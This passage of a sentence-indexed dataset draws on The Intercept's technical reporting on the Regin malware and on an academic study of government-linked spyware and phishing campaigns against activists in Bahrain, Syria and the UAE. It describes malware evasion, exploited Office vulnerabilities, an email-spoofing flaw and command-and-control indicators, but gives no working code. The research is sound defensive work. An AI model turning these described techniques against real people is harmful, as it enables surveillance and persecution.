Sunday said the firm had identified Regin on infected systems operated by private companies , government entities , and research institutes in countries such as Russia , Saudi Arabia , Mexico , Ireland , Belgium , and Iran .", "5822": "The use of hacking techniques and malware in state-sponsored espionage has been publicly documented over the last few years : China has been linked to extensive cyber espionage , and recently the Russian government was also alleged to have been behind a cyber attack on the White House .", "5823": "Regin further demonstrates that Western intelligence agencies are also involved in covert cyberespionage .", "5824": "GCHQ declined to comment for this story .", "5825": "The agency issued its standard response to inquiries , saying that '' it is longstanding policy that we do not comment on intelligence matters '' and '' all of GCHQ 's work is carried out in accordance with a strict legal and policy framework , which ensures that our activities are authorised , necessary and proportionate .", "5826": "'' The NSA said in a statement , '' We are not going to comment on The Intercept 's speculation .", "5827": "'' The Intercept has obtained samples of the malware from sources in the security community and is making it available for public download in an effort to encourage further research and analysis .", "5828": "( To download the malware , click here .", "5829": "The file is encrypted ; to access it on your machine use the password '' infected .", "5830": "'' ) What follows is a brief technical analysis of Regin conducted by The Intercept 's computer security staff .", "5831": "Regin is an extremely complex , multi-faceted piece of work and this is by no means a definitive analysis .", "5832": "In the coming weeks , The Intercept will publish more details about Regin and the infiltration of Belgacom as part of an investigation in partnership with Belgian and Dutch newspapers De Standaard and NRC Handelsblad .", "5833": "In Nordic mythology , the name Regin is associated with a violent dwarf who is corrupted by greed .", "5834": "It is unclear how the Regin malware first got its name , but the name appeared for the first time on the VirusTotal website on March 9th 2011 .", "5835": "Der Spiegel reported that , according to Snowden documents , the computer networks of the European Union were infiltrated by the NSA in the months before the first discovery of Regin .", "5836": "Industry sources familiar with the European Parliament intrusion told The Intercept that such attacks were conducted through the use of Regin and provided samples of its code .", "5837": "This discovery , the sources said , may have been what brought Regin to the wider attention of security vendors .", "5838": "Also on March 9th 2011 , Microsoft added related entries to its Malware Encyclopedia : Two more variants of Regin have been added to the Encyclopedia , Regin.B and Regin.C .", "5839": "Microsoft appears to detect the 64-bit variants of Regin as Prax.A and Prax.B .", "5840": "None of the Regin/Prax entries are provided with any sort of summary or technical information .", "5841": "They have an encrypted block which points to the location of the 2nd stage payload .", "5842": "On NTFS , that is an Extended Attribute Stream ; on FAT , they use the registry to store the body .", "5843": "This component consists of a service orchestrator working in Windows ' kernel .", "5844": "This stage is composed of a service orchestrator located in user land , provided with many modules which are loaded dynamically as needed .", "5845": "The sample has the following SHA256 hash : This sample gives a sense of the sophistication of the actors and the length of the precautions they have been taking in order to operate as stealthily as possible .", "5846": "When a Windows kernel driver needs to allocate memory to store some type of data , it creates so called kernel pools .", "5847": "Such memory allocations have specific headers and tags that are used to identify the type of objects contained within the block .", "5848": "For example such tags could be Proc , Thrd or File , which respectively indicate that the given block would contain a process , thread or file object structure .", "5849": "When performing forensic analysis of a computer 's memory , it is common to use a technique called pool scanning to parse the kernel memory , enumerate such kernel pools , identify the type of content and extract it .", "5850": "Just like Regin loader drivers , this driver repeatedly uses the generic '' Ddk '' tag with ExAllocatePoolWithTag ( ) when allocating all kernel pools : The generic tag which is used throughout the operating system when a proper tag is not specified .", "5851": "This makes it more difficult for forensic analysts to find any useful information when doing pool scanning , since all its memory allocations will mix with many generic others .", "5852": "Windows kernel drivers operate on different levels of priority , from the lowest PASSIVELEVEL to the highest HIGHLEVEL .", "5853": "This level is used by the processor to know what service give execution priority to and to make sure that the system does n't try to allocate used resources which could result in a crash .", "5854": "This technique is another example of the level of precaution the developers took while designing this malware framework .", "5855": "In an interview given to the Belgian magazine MondiaalNiews , Fabrice Cl\u00e9ment , head of security of Belgacom , said that the company first identified the attack on June 21 , 2013 .", "5856": "In the same interview Cl\u00e9ment says that the computers targeted by the attackers included staff workstations as well as email servers .", "5857": "These statements confirm the timing and techniques used in the attack .", "5858": "From previously identified Regin samples , The Intercept developed unique signatures which could identify this toolkit .", "5859": "A zip archive with a sample identified as Regin/Prax was found in VirusTotal , a free , online website which allows people to submit files to be scanned by several anti-virus products .", "5860": "The zip archive was submitted on 2013-06-21 07:58:37 UTC from Belgium , the date identified by Cl\u00e9ment .", "5861": "Sources familiar with the Belgacom intrusion told The Intercept that this sample was uploaded by a systems administrator at the company , who discovered the malware and uploaded it in an attempt to research what type of malware it was .", "5862": "The archive contains : Along with other files The Intercept found the output of a forensic tool , GetThis , which is being run on target systems looking for malware .", "5863": "From the content of the GetThis.log file , we can see that a sample called '' svcsstat.exe '' and located in C : \\Windows\\System32\\ was collected and a copy of it was stored .", "5864": "The malware in question is '' 0001000000000C1Csvcsstat.exesample '' .", "5865": "This is a 64bit variant of the first stage Regin loader aforementioned .", "5866": "The archive also contains the output of ProcMon , '' Process Monitor '' , a system monitoring tool distributed by Microsoft and commonly used in forensics and intrusion analysis .", "5867": "This file identifies the infected system and provides a variety of interesting information about the network .", "5868": "For instance : The following environment variable shows that the system was provided with a Microsoft SQL server and a Microsoft Exchange server , indicating that it might one of the compromised corporate mail server Fabrice Cl\u00e9ment mentioned to Mondiaal News : Below is a list of hashes for the files The Intercept is making available for download .", "5869": "Given that that it has been over a year since the Belgacom operation was publicly outed , The Intercept considers it likely that the GCHQ/NSA has replaced their toolkit and no current operations will be affected by the publication of these samples .", "5870": "Repressive nation-states have long monitored telecommunica- tions to keep tabs on political dissent .", "5871": "The Internet and online social networks , however , pose novel technical challenges to this practice , even as they open up new domains for surveil- lance .", "5872": "We analyze an extensive collection of suspicious files and links targeting activists , opposition members , and non- governmental organizations in the Middle East over the past several years .", "5873": "We find that these artifacts reflect efforts to at- tack targets ' devices for the purposes of eavesdropping , stealing information , and/or unmasking anonymous users .", "5874": "We describe attack campaigns we have observed in Bahrain , Syria , and the United Arab Emirates , investigating attackers , tools , and tech- niques .", "5875": "In addition to off-the-shelf remote access trojans and the use of third-party IP-tracking services , we identify commer- cial spyware marketed exclusively to governments , including Gamma 's FinSpy and Hacking Team 's Remote Control Sys- tem ( RCS ) .", "5876": "We describe their use in Bahrain and the UAE , and map out the potential broader scope of this activity by conduct- ing global scans of the corresponding command-and-control ( C & C ) servers .", "5877": "Finally , we frame the real-world consequences of these campaigns via strong circumstantial evidence linking hacking to arrests , interrogations , and imprisonment .", "5878": "Computer security research devotes extensive efforts to pro- tecting individuals against indiscriminate , large-scale attacks such as those used by cybercriminals .", "5879": "Recently , the prob- lem of protecting institutions against targeted attacks conducted by nation-states ( so-called '' Advanced Persistent Threats '' ) has likewise elicited significant research interest .", "5880": "Where these two problem domains intersect , however-targeted cyber attacks by nation-states against individuals-has received virtually no sig- nificant , methodical research attention to date .", "5881": "This new prob- lem space poses challenges that are both technically complex and of significant real-world importance .", "5882": "In this work we undertake to characterize the emergent prob- lem space of nation-state Internet attacks against individuals engaged in pro-democracy or opposition movements .", "5883": "While we lack the data to do so in a fully comprehensive fashion , we provide extensive detail from both technical and operational perspectives as seen in three countries .", "5884": "We view such character- izations as the fundamental first step necessary for the rigorous , scientific pursuit of a new problem space .", "5885": "For our study we draw upon several years of research we have conducted into cases from Bahrain , Syria and the United Arab Emirates .", "5886": "We frame the nature of these attacks , and the technology and infrastructure used to conduct them , in the con- text of their impacts on real people .", "5887": "We hope in the process to inspire additional research efforts addressing the difficult prob- lem of how to adequately protect individuals with very limited resources facing powerful adversaries .", "5888": "As an illustration of this phenomenon , consider the follow- ing anecdote , pieced together from public reports and court documents .", "5889": "At dawn on 3/12/13 , police raided the house of 17-year- old Ali Al-Shofa , confiscated his laptop and phone , and took him into custody .", "5890": "He was charged with referring to Bahrain's King as a '' dictator '' ( ) and '' fallen one '' ( ) on a pseudonymous Twitter account , @ alkawarahnews .", "5891": "Accord- ing to court documents , Bahrain 's Cyber Crime Unit had linked an IP address registered in his father 's name to the account on 12/9/12 .", "5892": "Operators of @ alkawarahnews later forwarded a suspicious private message to one of the authors .", "5893": "The message was received on 12/8/12 on a Facebook account linked to the Twitter handle , and contained a link to a protest video , purport- edly sent by an anti-government individual .", "5894": "The link redirected through iplogger.org , a service that records the IP address of anyone who clicks .", "5895": "Analytics for the link indicate that it had been clicked once from inside Bahrain .", "5896": "On 6/25/13 , Ali was sentenced to one year in prison .", "5897": "Ali 's case is an example of the larger phenomenon we in- vestigate : attacks against activists , dissidents , trade unionists , human rights campaigners , journalists , and members of NGOs ( henceforth '' targets '' ) in the Middle East .", "5898": "The lat- ter advertises that governments need its technology to '' look through their target 's eyes '' rather than rely solely on '' passive monitoring '' .", "5899": "Overall , the attacks we document are rarely technically novel .", "5900": "In fact , we suspect that the majority of at- tacks could be substantially limited via well-known security practices , settings , and software updates .", "5901": "We obtained the majority of our artifacts by encouraging in- dividuals who might be targeted by governments to provide us with suspicious files and unsolicited links , especially from un- familiar senders .", "5902": "While this process has provided a rich set of artifacts to analyze , it does not permit us to claim our dataset is representative .", "5903": "Our analysis links these attacks with a common class of ac- tor : an attacker whose behavior , choice of target , or use of in- formation obtained in the attack , aligns with the interests of a government .", "5904": "In some cases , such as Ali 's , the attackers appear to be governments themselves ; in other cases , they appear in- stead to be pro-government actors , ranging from patriotic , not necessarily skilled volunteers to cyber mercenaries .", "5905": "The phe- nomenon has been identified before , such as in Libya , when the fall of Gaddafi 's regime revealed direct government ties to hacking during the 2011 Civil War .", "5906": "We make the following contributions : \u2022 We analyze the technology associated with targeted at- tacks ( e.g. , malicious links , spyware ) , and trace it back to its programmers and manufacturers .", "5907": "While the attacks are not novel-and indeed often involve technology used by the cybercrime underground-they are significant be- cause they have a real-world impact and visibility , and are connected to governments .", "5908": "In addition , we often find amateurish mistakes in either the attacker 's technology or operations , indicating that energy spent countering these threats can realize significant benefits .", "5909": "We do not , how- ever , conclude that all nation-state attacks or attackers are incompetent , and we suspect that some attacks have evaded our detection .", "5910": "\u2022 When possible , we empirically characterize the attacks and technology we have observed .", "5911": "We map out global use of two commercial hacking tools by governments by searching through Internet scan data using fingerprints for command-and-control ( C & C ) servers derived from our spyware analysis .", "5912": "\u2022 We develop strong evidence tying attacks to govern- ment sponsors and corporate suppliers , countering de- nials , sometimes energetic and sometimes indirect , of such involvement [ , , , ] , in contrast to denials or claims of a corporate '' oversight '' board .", "5913": "Our scan- ning suggests use of '' lawful intercept '' trojans by 11 ad- ditional countries considered governed by '' authoritarian regimes .", "5914": "'' We believe that activists and journalists in such countries may experience harassment or consequences to life or liberty from government surveillance .", "5915": "Finally , we do not explore potential defenses appropriate for protecting the target population in this work .", "5916": "We believe that to do so in a sufficiently well-grounded , meaningful manner first requires developing an understanding of the targets ' knowledge of security issues , their posture regarding how they currently protect themselves , and the resources ( including potentially ed- ucation ) that they can draw upon .", "5917": "To this end , we are now con- ducting ( with IRB approval ) in-depth interviews with potential targets along with systematic examination of their Internet de- vices in order to develop such an understanding .", "5918": "In the past decades , a rich body of academic work has grown to document and understand government Internet censorship , in- cluding nationwide censorship campaigns like the Great Fire- wall of China [ , , ] .", "5919": "Research on governmental Internet surveillance and activities like law-enforcement interception is a comparatively smaller area .", "5920": "Some academic work looks at government use of devices to enable censorship , such as key- word blacklists for Chinese chat clients , or the Green Dam censorware that was to be deployed on all new computers sold in China .", "5921": "We are aware of only limited previous work looking at advanced threat actors targeting activists with hack- ing , though this work has not always been able to establish ev- idence of government connections .", "5922": "Platforms used by potential targets , such as GMail , Twitter , and Facebook increasingly make transport- layer encryption the default , obscuring communications from most network surveillance .", "5923": "This use of encryption , along with the global nature of many social movements , and the role of diaspora groups , likely makes hacking increasingly attractive , especially to states who are unable to request or compel content from these platforms .", "5924": "Indeed , the increasing use of encryption and the global nature of targets have both been cited by pur- veyors of '' lawful intercept '' trojans in their marketing materi- als [ , ] .", "5925": "In one notable case in 2009 , UAE telecom firm Eti- salat distributed a system update to its then 145,000 BlackBerry subscribers that contained spyware to read encrypted Black- Berry e-mail from the device .", "5926": "The spyware was discovered when the update drastically slowed users ' phones .", "5927": "In con- trast to country-scale distribution , our work looks at this kind of pro-government and government-linked surveillance through highly targeted attacks .", "5928": "The term APT ( Advanced Persistent Threat ) refers to a sophisticated cyber-attacker who persistently attempts to tar- get an individual or group .", "5929": "Work outside the academic community tracking government cyberattacks typically falls under this umbrella .", "5930": "There has been significant work on APT outside the academic community , especially among se- curity professionals , threat intelligence companies , and human rights groups .", "5931": "Much of this work has focused on suspected government-on-government or government-on-corporation cy- ber attacks [ , ] .", "5932": "Meanwhile , a small but growing body of this research deals with attacks carried out by governments against opposition and activist groups operating within , as well as outside their borders .", "5933": "One of the most notable cases is GhostNet , a large-scale cyber espionage campaign against the Tibetan independence movement [ , ] .", "5934": "Other work avoids drawing conclusions about the attackers .", "5935": "Our study is based on extensive analysis of malicious files and suspect communications relevant to the activities of targeted groups in Bahrain , Syria , and the UAE , as documented in Ta- ble 1 .", "5936": "A number of the attacks had significant real-world impli- cations , per Table 2 .", "5937": "In many cases , we keep our descriptions somewhat imprecise to avoid potential leakage of target identi- ties .", "5938": "We began our work when contacted by individuals con- cerned that a government might have targeted them for cyber- attacks .", "5939": "As we became more acquainted with the targeted com- munities , in some cases we contacted targeted groups directly ; in others , we reached out to individuals with connections to tar- geted groups , who allowed us to examine their communications with the groups .", "5940": "For Bahrain and Syria , the work encompassed 10,000s of e-mails and instant messages .", "5941": "For the UAE , the vol- ume is several thousand communications .", "5942": "This following sections outline recent targeted hacking cam- paigns in Bahrain , Syria and the UAE .", "5943": "These cases have a com- mon theme : attacks against targets ' computers and devices with malicious files and links .", "5944": "We also , however , frequently find technical and op- erational errors by the attackers that enable us to link attacks to governments .", "5945": "We have analyzed two attack campaigns in the context of Bahrain , where the government has been pursuing a crackdown against an Arab-Spring inspired uprising since 2/14/2011 .", "5946": "Some individuals who apparently clicked on these links were later arrested , including Ali ( cf .", "5947": "\u00a71 ) , whose click appears to have been used against him in court .", "5948": "While both campaigns point back to the government , we have not as yet identified overlap between the campaigns ; targets of FinSpy appeared to reside mainly outside Bahrain , whereas the IP spy links targeted those mainly inside the country .", "5949": "We examine each campaign in turn .", "5950": "Beginning in April 2012 , the authors received 5 suspicious e-mails from US and UK-based activists and journalists working on Bahrain .", "5951": "Under default security settings , Office disables all unsigned macros , so that a user who opens the document will only see an informational message that the macro has been disabled .", "5952": "Thus , this attack was apparently designed with the belief or hope that targets would have reduced security settings .", "5953": "Identification as FinSpy : By running the sample using Windows Virtual PC , we found the following string in mem- ory : y : \\lsvnbranches\\finspyv4.01\\finspyv2\\ .", "5954": "This string suggests FinSpy , a product of Gamma Inter- national .", "5955": "We de- vised a fingerprint for the obfuscater and located a structurally similar executable by searching a large malware database .", "5956": "Since it did not in- clude anti-VM code , we ran it in TEMU , an x86 emulator de- signed for malware analysis .", "5957": "TEMU captures instruction- level execution traces and provides support for taint-tracking .", "5958": "The private key presumably resides on the C & C server .", "5959": "The weak AES keys make decryption of the data straightfor- ward .", "5960": "We wrote a program that generally can find these keys in under an hour , exploiting the fact that many of the system clock readings occur within the same clock-update quantum .", "5961": "In addition , FinSpy 's AES code fails to encrypt the last block of data if less than the AES block size of 128 bits , leaving trail- ing plaintext .", "5962": "While we suspect FinSpy 's cryptographic deficiencies reflect bugs , it is also con- ceivable that the cryptography was deliberately weakened to facilitate one government monitoring the surveillance of oth- ers .", "5963": "Analyzing network traffic between our infected VM and the C & C server revealed that the server used a global IPID , which allowed us to infer server activity by its progression .", "5964": "In response to our preliminary work an executive at Gamma told the press that Bahrain 's FinSpy server was merely a proxy and the real server could have been anywhere , as part of a claim that the Bahrain FinSpy deployment could have been associ- ated with another government .", "5965": "However , a proxy would show gaps in a global IPID as it forwarded traffic ; our frequent observation of strictly consecutive IPIDs thus contradicts this statement .", "5966": "Exploitation of captured data : Since we suspected the spy- ware operator would likely seek to exploit captured credentials , particularly those associated with Bahraini activist organiza- tions , we worked with Bahrain Watch , an activist organization inside Bahrain .", "5967": "Bahrain Watch established a fake login page on their website and provided us with a username and pass- word .", "5968": "From a clean VM , we logged in using these credentials , saving the password in Mozilla Firefox .", "5969": "Bahrain Watch 's website logs revealed a subsequent hit from 89.148.0.41-made however to the site 's home- page , rather than its login page-coming shortly after we had infected the VM .", "5970": "Decrypting packet captures of the spyware's activity , we found that our VM sent the password to the server exactly one minute earlier : The URL provided to the server did not include the path to the login page , which was inaccessible from the home- page .", "5971": "This omission reflects the fact that the Firefox password database stores only domain names , not full login page URLs , for each password .", "5972": "Repeating the experiment again yielded a hit from the same IP address within a minute .", "5973": "We inspected Bahrain Watch 's logs , which showed no subsequent ( or previ- ous ) activity from that address , nor any instances of the same User Agent string .", "5974": "The attacker then discovers the victim 's identity from their ISP .", "5975": "In one case we identified legal documents that pro- vided a circumstantial link between such a spy link and a sub- sequent arrest .", "5976": "Figure 2 illustrates the larger ecosystem of these attacks .", "5977": "The attackers appear to represent a single entity , as the activity all connects back to accounts that sent links shortened using a par- ticular user account al9mood on the bit.ly URL shortening service .", "5978": "Recall Ali Faisal Al-Shufa ( discussed in Section 1 ) , who was accused of sending insulting tweets from an account @ alkawarahnews ( Al Kawarah News in Figure 2 ) .", "5979": "An op- erator of the account forwarded us a suspicious private message sent to the Al Kawarah News Facebook account from Red Sky .", "5980": "Red Sky was purportedly arrested on 10/17/12 , was convicted of insulting the King on his Twitter account @ RedSky446 , and was sentenced to four months prison .", "5981": "When released , he found that the passwords for his Twitter , Facebook , and e-mail accounts had been changed , and did not know how to recover his accounts .", "5982": "The message that Red Sky 's account sent to Al Kawarah News included a link shortened using Google 's goo.gl ser- vice .", "5983": "We used the goo.gl API to access analytics for the link , finding that it unshortened to iplogger.org/25SX and was created on 12/8/12 .", "5984": "The link had received only one click , which came from Bahrain with the referrer www.facebook.com .", "5985": "Ali 's case files contained a request from the Public Prose- cution for information on an IP address that it had linked to Al Kawarah News about 22 hours after the link was created .", "5986": "Court documents indicate that ISP data linked the IP address to Ali , and on this basis he was sentenced to one year in prison .", "5987": "Red Sky also targeted M in Figure 2 .", "5988": "M recalled click- ing on a link from Red Sky while using an Internet connec- tion from one of the houses in M 's village .", "5989": "The house was raided by police on 3/12/13 , who were looking for the sub- scriber of the house 's internet connection .", "5990": "Police questioning revolved around Tweets that referred to Bahrain 's King as a '' cursed one .", "5991": "The attack on Jehad Abdulla is noteworthy , as the ac- count 's activity aligned with communities typically critical of Bahrain 's opposition .", "5992": "However , the account also directly crit- icized the King on occasion , in one case referring to him as '' weak '' and '' stingy .", "5993": "On 10/16/12 , Salman Darwish was arrested for insulting the King using the Jehad Abdulla account .", "5994": "He was sentenced to one month in prison , partly on the basis of his confession .", "5995": "Salman's father claims that police denied Salman food , drink , and medi- cal care .", "5996": "Another account linked to al9mood targeted @ YLUBH , the Twitter account of Yokogawa Union , a trade union at the Bahraini branch of a Japanese company .", "5997": "Yokogawa fired the leader of the trade union , Sami Ab- dulaziz Hassan , on 3/23/13 .", "5998": "It later emerged that Sami was indeed the operator of the @ YLUBH account , and that the police had called him in for questioning in relation to its tweets .", "5999": "Figure 2 shows two such cases , Maryam and Sayed Yousif .", "6000": "While ReadNotify.com forbids spoofing in their TOS , the service has a vulnerability known to the attackers ( and which we confirmed ) that allows spoofing the From address by directly setting the parameters on a submission form on their website .", "6001": "We have not found evidence suggesting this vulnerabil- ity is publicly known , but it appears clear that the attacker ex- ploited it , as the web form adds a X-Mai1er : RNwebmail header not added when sending through ReadNotify.com's other supported methods .", "6002": "The header appeared in each e-mail the targets forwarded to us .", "6003": "When spoofing using this method , the original sender ad- dress still appears in X-Sender and other headers .", "6004": "Accord- ing to these , the e-mails received by the targets all came from fatoomah85 @ gmail.com .", "6005": "A link sent in one of these e- mails was connected to the al9mood bit.ly account .", "6006": "In monitoring accounts connected to al9mood , we counted more than 200 IP spy links in Twitter messages and public Facebook posts .", "6007": "In one particularly clever tactic , attackers exploited Twitter 's default font , for example substituting a lowercase '' l '' with an uppercase '' I '' or switching vowels ( e.g .", "6008": "from '' a '' to an '' e '' ) to create at-a-glance identical usernames .", "6009": "In addition , malicious accounts tended to quickly delete IP spy tweets sent via ( public ) mentions , and frequently change profile names .", "6010": "The use of RATs against the opposition has been a well- documented feature of the Syrian Civil War since the first re- ports were published in early 2012 [ , , , , ] .", "6011": "The phenomenon is widespread , and in our experience , most mem- bers of the opposition know that some hacking is taking place .", "6012": "The seeding techniques and bait files suggest a good understanding of the opposition 's needs , fears and behavior , coupled with ba- sic familiarity with off-the-shelf RATs .", "6013": "In some cases attacks occur in a context that points to a more direct connection to one of the belligerents : the Syrian opposition has regularly ob- served that detainees ' accounts begin seeding malware shortly after their arrest by government forces .", "6014": "Researchers and security professionals have already profiled many of these RATs , including DarkComet [ , ] , Black- shades Remote Controller , Xtreme RAT , njRAT , and ShadowTech .", "6015": "Some are available for purchase by any- one , in contrast to '' government only '' FinSpy and RCS .", "6016": "For ex- ample , Xtreme RAT retails for e350 , while a version of Black- shades lists for e40 .", "6017": "Others , like DarkComet , are free .", "6018": "We have also observed cracked versions of these RATs on Arabic- language hacker forums , making them available with little ef- fort and no payment trail .", "6019": "'' dis- play to the victim as '' .rcs.pdf", "6020": ".", "6021": "Our illustration shows in abstract terms the use of Victim A 's account to seed mal- ware ( '' Aleppo Plan '' ) via ( say ) Skype messages to Victim ( s ) Bn .", "6022": "In the cases of Opp .", "6023": "One domain remains active , hosting a website of the Salafist Al-Nusra front , while the other appears dormant .", "6024": "Interestingly , in the case of the fake Skype encryption the deception extended to a YouTube video from '' IT Se- curity Lab '' demonstrating the program 's purported ca- pabilities , as well as a website promoting the tool , skype- encryption.sytes.net .", "6025": "The attackers also constructed a ba- sic , faux GUI for their '' Encryption '' program ( see Figure 4 ) .", "6026": "The fake GUI has a number of non-functional buttons like '' En- crypt '' and '' DeCrypt , '' which generate fake prompts .", "6027": "Anecdotally , campaign volume appears to track significant events in the ongoing conflict .", "6028": "For example , campaigns dwin- dled and then rebounded within hours after Syria 's 2012 Inter- net shutdown .", "6029": "Similarly , activity observed by the authors also dwindled prior to expectation of US-led military action against Syrian government targets in September 2013 .", "6030": "Once this option appeared to be off the table , the volume of new samples and campaigns we observed again increased , includ- ing the recent targeting of NGO workers per Figure 3 .", "6031": "We are aware of only a negligible number of cases of the opposition using similar RATs against Syrian Government supporters , al- though evidence exists of other kinds of electronic attacks by third parties .", "6032": "The logistics and activities of Syria 's numerous opposition groups are intentionally concealed from public view to protect both their efficacy , and the lives of people participating in them .", "6033": "Nevertheless , Syrian opposition members are generally familiar with stories off digital compro- mises of high-profile figures , including those entrusted with the most sensitive roles , as well as rank-and-file members .", "6034": "Com- promise of operational security poses a documented threat to life both for victims of electronic compromise , and to family members and associates .", "6035": "The Syrian conflict is ongoing , making it difficult to assem- ble comprehensive evidence of linkages between government actors and malware campaigns .", "6036": "Moreover , many individuals whose identities have been compromised are in prison or oth- erwise disappeared , and thus unable to relate the evidence pre- sented to them during interrogation .", "6037": "Still , strong circumstantial evidence links the use of RATs , phishing , and government ac- tivity , which we briefly summarize here : ( 1 ) many Syrians have recounted to journalists and the authors how interrogators con- fronted them with material from their computers .", "6038": "For example : The policeman told me , '' Do you remember when you were talking to your friend and you told him you had something wrong [ sic ] and paid a lot of money ? At that time we were taking information from your laptop .", "6039": "'' ( 2 ) Syrian activists have supplied cases to international journal- ists , where arrests are quickly followed by the social me- dia accounts of detained individuals seeding malware to contact lists ( Figure 3 ) .", "6040": "( 3 ) Finally , despite the notoriety of the attack campaigns , including mention of C & C IPs in international me- dia , the Syrian government has made no public statements about these campaigns nor acted to shut down the servers .", "6041": "Beyond the ongoing challenges of attribution , these malware campaigns have a tangible impact on the Syrian opposition , and generally align with the interests of the Syrian government's propaganda operations .", "6042": "The case of Abdul Razzaq Tlass , a leader in the Free Syrian Army , is illustrative of the potential uses of such campaigns .", "6043": "In 2012 a string of videos emerged showing Tlass sexting and engaged in lewd activity in front of a webcam .", "6044": "While he denied the videos , the harm to his rep- utation was substantial and he was eventually replaced .", "6045": "While the UAE has experienced no recent uprising or politi- cal unrest , it has nevertheless cracked down on its opposition , concurrent with the Arab Spring .", "6046": "The associated C & C server indicated direct UAE government involvement .", "6047": "Over time , we stopped receiving RCS samples from UAE targets , and instead observed a shift to the use of off-the-shelf RATs , and possible involvement of cyber-mercenary groups .", "6048": "However , poor attacker operational security .allowed", "6049": "us to link most observed attacks together .", "6050": "UAE activist Ahmed Mansoor ( per Figure 5 ) , impris- oned from April to November 2011 after signing an online pro- democracy petition , received an e-mail purportedly from '' Arabic Wikileaks '' in July 2012 .", "6051": "He opened the associated at- tachment , '' veryimportant.doc , '' and saw what he described as '' scrambled letters '' .", "6052": "He forwarded us the e-mail for investiga- tion .", "6053": "The attachment exploited CVE-2010-3333 , an RTF pars- ing vulnerability in Microsoft Office .", "6054": "The document did not contain any bait content , and part of the malformed RTF that triggered the exploit was displayed in the document .", "6055": "We denote this combination as the 3-Stage Ex- ploit Kit in Figure 5 .", "6056": "When we ob- tained the sample in July 2012 , ar-24.com resolved to an IP address on Linode , a hosting provider .", "6057": "Three months later , it resolved to a UAE address belonging to the Royal Group , an organization linked to the UAE government ; it is chaired by Sheikh Tahnoon bin Zayed Al-Nayhan , a member of the UAE ruling family and a son of the founder of the UAE .", "6058": "Identification as RCS : We identified strings in memory that matched those in a Symantec analysis of RCS ( also known as DaVinci or Crisis ) , a product of the Italian com- pany Hacking Team .", "6059": "We also located a structurally sim- ilar Word document via VirusTotal .", "6060": "Analysis of capabilities : RCS has a suite of functionality largely similar to FinSpy .", "6061": "If embedded as an applet , and no exploit is present , Java displays a security warning and asks the user whether they authorize the installation .", "6062": "Another difference is in persistence .", "6063": "We did not observe similar capabilities in the FinSpy samples we examined .", "6064": "Exploitation of captured data : When Ahmed Mansoor re- ceived the RCS document , he opened it , infecting his computer ( Figure 5 ) .", "6065": "The suspicious accesses stopped after removal of the application-specific password .", "6066": "The e-mail was sent from the UAE's timezone ( as well as of other countries ) and contained the terms '' veryimportant '' and '' wikileaks '' , just like in the e-mail re- ceived by Ahmed .", "6067": "Possible consequences : Shortly after he was targeted , Ahmed says he was physically assaulted twice by an attacker who appeared able to track Ahmed 's location .", "6068": "He also re- ports that his car was stolen , a large sum of money disappeared from his bank account , and his passport was confiscated .", "6069": "He believes these consequences are part of a government in- timidation campaign against him , but we did not uncover any direct links to his infection .", "6070": "We were unable to obtain the second stage or the ultimate pay- load , as the website was unavailable at the time of testing .", "6071": "However , the exploit kit appears indicative of Hacking Team involvement .", "6072": "A page on faddeha.com found in Google's cache contained an embedded .jar", "6073": "with the same applet class ( WebEnhancer ) as those observed in other .jar", "6074": "files that we found to contain RCS .", "6075": "We found a file that VirusTotal had downloaded from faddeha.com , which appeared to be a re- mote access toolkit known as SpyNet , available for general pur- chase for 50 Euros .", "6076": "SpyNet Packing : We found another instance of the first stage of the 3-Stage Exploit Kit on VirusTotal .", "6077": "The sample was packed using ASProtect .", "6078": "Finally , this executable unpacks SpyNet .", "6079": "SpyNet 's GUI only offers an option to pack with UPX , suggesting that the attack- ers specially added the other layers of packing .", "6080": "In some cases , the Visual Basic project bears the name NoWayTech , which appears to be an underground RunPE tool , while others are named SpyVisual , which we have been unable to trace to any public underground tools , and thus also may reflect customiza- tion by the attacker .", "6081": "The SpyVisual projects contain the string c : \\Users\\Zain\\AppData\\Local\\Temp\\OLE1EmbedStrm.wav , which we used as the fingerprint VB Packer in Figure 6 .", "6082": "Cedar Key attack : The same VB Packer was used in an attack on Relative of political detainee D and H.R .", "6083": "activist E in Figure 6 .", "6084": "Loading the page greeted the target with '' Video loading please wait .", "6085": ".", "6086": ".", "6087": "Oracle released a patch 12 hours after activists began receiving these links .", "6088": "The cedarkeyrv.com domain is associated with an RV park in Cedar Key , Florida .", "6089": "The website 's hosting company told us that the site had apparently suffered a compromise , but did not have further details .", "6090": "The exploit used in the attack appears to have been origi- nally posted by a Kuwaiti user , njq8 , on an Arabic-language exploit sharing site .", "6091": "We contacted njq8 , who told us that he had obtained the exploit elsewhere and modified it prior to posting .", "6092": "This same C & C occurred in an- other attack ( Figure 6 ) targeting Relative of political detainee D ; in that case , the payload was a freely-available RAT known as njRAT , written by the same njq8 as the exploit-poster dis- cussed above .", "6093": "However , we did not find any other evidence suggesting njq8 's involvement in either attack .", "6094": "More SpyNet attacks : The domain hamas.sytes.net , which we previously saw used by two SpyNet sam- ples , resolved to 67.205.79.177 .", "6095": "Historically , dreems.no-ip.ca also resolved to this address .", "6096": "The SMTP source of the e-mail was webmail.upload.bz .", "6097": "Appin : In early 2013 UAE H.R .", "6098": "activist E forwarded nu- merous documents that included a particular CVE-2012-0158 exploit for Microsoft Word .", "6099": "All three domains match those used by an Indian cybermercenary group said to be linked to Appin Security Group .", "6100": "The former two domains hosted content other than spyware ( i.e. , they may have been compromised ) .", "6101": "We alerted the owner of www.getmedia.us , who removed the payloads .", "6102": "The samples we received afforded us an opportunity to em- pirically characterize the use of FinFisher and Hacking Team around the world , enabling us to assess their prevalence , and identify other country cases that may warrant future investiga- tion .", "6103": "We analyzed the samples and the behavior of their C & C servers to develop indicators ( fingerprints ) for how the servers respond to certain types of requests .", "6104": "We then scanned the full Internet IPv4 address space ( '' /0 '' ) for these , along with prob- ing results found by past scans .", "6105": "In many cases we do not release the full details of our fingerprints to avoid compromising what may be legitimate investigations .", "6106": "Identifying and linking servers : We developed a number of fingerprints for identifying FinSpy servers using HTTP- based probing as well as FinSpy 's custom TLV-based proto- col. We leveraged quirks such as specific non-compliance with RFC 2616 , responses to certain types of invalid data , and the presence of signatures such as the bizarre '' Hallo Steffi '' that Guarnieri identified from Bahraini FinSpy C & C servers [ , ] .", "6107": "See Appendix A for details .", "6108": "We then exhaus- tively scanned the Internet looking for matches to these finger- prints .", "6109": "In Spring 2013 we noticed FinSpy servers now issuing 302 Redirects to google.com .", "6110": "However , we noticed anomalies : for ex- ample , servers in India were redirecting to the Latvian ver- sion of Google google.lv .", "6111": "We suspect that the server in India was a relay forwarding to a master in Latvia .", "6112": 